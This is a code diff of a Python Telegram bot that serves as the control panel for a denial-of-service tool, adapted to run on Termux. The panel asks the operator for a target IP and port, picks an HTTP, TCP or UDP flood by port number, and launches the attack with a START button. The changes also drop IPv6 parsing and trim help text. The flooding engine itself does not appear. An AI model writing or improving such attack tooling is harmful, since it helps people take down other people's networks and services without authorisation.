@@ -1,15 +1,14 @@
 """
-Clean Bot Handler - Control Panel with Method Selection
+Bot Handler for Termux - Clean IP Attack Only
 """
 
 import asyncio
 import logging
 import random
-from typing import Optional, Dict, Any
+from typing import Dict, Any
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 
-# Parse mode fix
 try:
     from pyrogram.enums import ParseMode
     HTML = ParseMode.HTML
@@ -23,12 +22,12 @@ logger = logging.getLogger(__name__)
 
 # User states
 states: Dict[int, Dict] = {}
-# Active status messages for live updates
+# Status messages for live updates
 status_messages: Dict[int, Any] = {}
 
 
 class BotHandler:
-    """Control Panel with Method Auto-Detection"""
+    """Clean Control Panel - Direct IP Attack Only"""
     
     def __init__(self, bot: Client, attack_engine, admin_id: int):
         self.bot = bot
@@ -36,6 +35,10 @@ class BotHandler:
         self.admin_id = admin_id
         self.logger = logging.getLogger(__name__)
         self._register_handlers()
+    
+    def register_handlers(self):
+        """Public method for compatibility"""
+        pass
     
     def _register_handlers(self):
         
@@ -58,15 +61,12 @@ class BotHandler:
                 "╔════════════════════════╗\n"
                 "║   🤖 <b>CONTROL PANEL</b>   ║\n"
                 "╚════════════════════════╝\n\n"
-                "<b>System Status:</b> <code>ONLINE</code> ✅\n"
+                "<b>System:</b> <code>ONLINE</code> ✅\n"
+                "<b>Platform:</b> <code>Termux</code> 📱\n"
                 f"<b>Threads:</b> <code>{Config.THREAD_COUNT}</code>\n"
-                f"<b>Max Requests:</b> <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
-                f"<b>Auto-Method:</b> <code>ENABLED</code>\n\n"
-                "<i>Bot auto-detects attack method:</i>\n"
-                "• Port 80/443 → HTTP Flood\n"
-                "• Port 21/22/25 → TCP Flood\n"
-                "• Others → UDP Flood\n\n"
-                "━━━━━━━━━━━━━━━━━━━━━━"
+                f"<b>Max Requests:</b> <code>{format_number(Config.MAX_REQUESTS)}</code>\n\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                "<b>Select an option:</b>"
             )
             
             await message.reply_text(text, reply_markup=keyboard, parse_mode=HTML)
@@ -94,8 +94,7 @@ class BotHandler:
                 "• <code>127.0.0.1:53</code> → UDP\n\n"
                 "Or manually specify:\n"
                 "<code>IP:PORT:METHOD</code>\n"
-                "• <code>1.1.1.1:80:udp</code>\n"
-                "• <code>1.1.1.1:443:tcp</code>",
+                "• <code>1.1.1.1:80:udp</code>",
                 reply_markup=keyboard,
                 parse_mode=HTML
             )
@@ -202,7 +201,7 @@ class BotHandler:
                 "• Ports 80, 443, 8080 → HTTP\n"
                 "• Ports 21, 22, 25, 53 → TCP\n"
                 "• Others → UDP\n\n"
-                "<i>Edit via Heroku Config Vars</i>"
+                "<i>Edit .env file to change</i>"
             )
             
             await callback.edit_message_text(text, reply_markup=keyboard, parse_mode=HTML)
@@ -227,9 +226,9 @@ class BotHandler:
                 "╔════════════════════════╗\n"
                 "║   🤖 <b>CONTROL PANEL</b>   ║\n"
                 "╚════════════════════════╝\n\n"
-                "<b>System Status:</b> <code>ONLINE</code> ✅\n"
-                f"<b>Threads:</b> <code>{Config.THREAD_COUNT}</code>\n"
-                f"<b>Max Requests:</b> <code>{format_number(Config.MAX_REQUESTS)}</code>\n\n"
+                "<b>System:</b> <code>ONLINE</code> ✅\n"
+                "<b>Platform:</b> <code>Termux</code> 📱\n"
+                f"<b>Threads:</b> <code>{Config.THREAD_COUNT}</code>\n\n"
                 "━━━━━━━━━━━━━━━━━━━━━━"
             )
             
@@ -294,49 +293,27 @@ class BotHandler:
             text = message.text.strip()
             
             if user_id in states and states[user_id].get('step') == 'waiting_ip':
-                # Parse input - support IP:PORT or IP:PORT:METHOD
+                # Parse input
                 parts = text.split(':')
                 
                 if len(parts) < 2:
                     await message.reply_text(
                         "❌ <b>Invalid Format!</b>\n\n"
                         "Use: <code>IP:PORT</code> or <code>IP:PORT:METHOD</code>\n"
-                        "Ex: <code>192.168.1.1:80</code> or <code>1.1.1.1:53:udp</code>",
+                        "Ex: <code>192.168.1.1:80</code>",
                         parse_mode=HTML
                     )
                     return
                 
-                # Handle IPv6 addresses
-                if text.startswith('['):
-                    # IPv6 format: [::1]:80 or [::1]:80:udp
-                    end_bracket = text.find(']')
-                    if end_bracket == -1:
-                        await message.reply_text("❌ Invalid IPv6 format", parse_mode=HTML)
-                        return
-                    ip = text[:end_bracket+1]
-                    rest = text[end_bracket+1:]
-                    if rest.startswith(':'):
-                        rest = rest[1:]
-                    rest_parts = rest.split(':')
-                    try:
-                        port = int(rest_parts[0])
-                        method = rest_parts[1].lower() if len(rest_parts) > 1 else 'auto'
-                    except ValueError:
-                        await message.reply_text("❌ Invalid port", parse_mode=HTML)
-                        return
-                else:
-                    # IPv4 format
-                    try:
-                        port = int(parts[1])
-                        ip = parts[0]
-                        method = parts[2].lower() if len(parts) > 2 else 'auto'
-                    except (ValueError, IndexError):
-                        await message.reply_text("❌ Invalid format", parse_mode=HTML)
-                        return
+                try:
+                    port = int(parts[1])
+                    ip = parts[0]
+                    method = parts[2].lower() if len(parts) > 2 else 'auto'
+                except (ValueError, IndexError):
+                    await message.reply_text("❌ Invalid format", parse_mode=HTML)
+                    return
                 
-                # Validate IP
-                clean_ip = ip.strip('[]')
-                if not is_valid_ip(clean_ip):
+                if not is_valid_ip(ip):
                     await message.reply_text("❌ Invalid IP address", parse_mode=HTML)
                     return
                 
@@ -369,8 +346,7 @@ class BotHandler:
                     f"<b>IP:</b> <code>{ip}</code>\n"
                     f"<b>Port:</b> <code>{port}</code>\n"
                     f"<b>Method:</b> <code>{detected.upper()}</code>\n"
-                    f"<b>Threads:</b> <code>{Config.THREAD_COUNT}</code>\n"
-                    f"<b>Max Requests:</b> <code>{format_number(Config.MAX_REQUESTS)}</code>\n\n"
+                    f"<b>Threads:</b> <code>{Config.THREAD_COUNT}</code>\n\n"
                     f"Click <b>🚀 START</b> to begin:",
                     reply_markup=keyboard,
                     parse_mode=HTML
